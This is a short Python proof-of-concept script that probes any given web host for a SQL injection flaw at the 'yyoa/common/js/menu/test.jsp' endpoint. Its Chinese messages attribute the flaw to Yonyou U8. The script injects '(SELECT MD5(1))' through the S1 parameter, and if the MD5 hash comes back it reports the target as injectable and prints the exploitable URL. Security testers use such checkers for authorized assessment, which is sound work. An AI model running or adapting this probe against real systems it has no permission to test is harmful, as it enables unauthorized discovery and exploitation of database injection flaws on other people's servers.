import time
import requests
import re
import sys
from urllib.parse import quote

def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())
    
def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    url = target_url + 'yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360'
    }
    success_msg = now_time() + '[SUCCESS]  该系统可能存在SQL注入漏洞'
    shell_msg = now_time() + '具体URL为: {}'.format(url)
    warning_msg = now_time() + '[WARNING]该系统的用友U8不存在SQL注入'
    error_msg = now_time() + '[用友U8存在SQL注入][ERROR]请求失败，可能无法与目标建立连接或目标不存在'
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=url, headers=headers, timeout=30)
        if response.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in response.text:
            return success_msg,shell_msg
        else:
            return warning_msg
    except:
        return error_msg

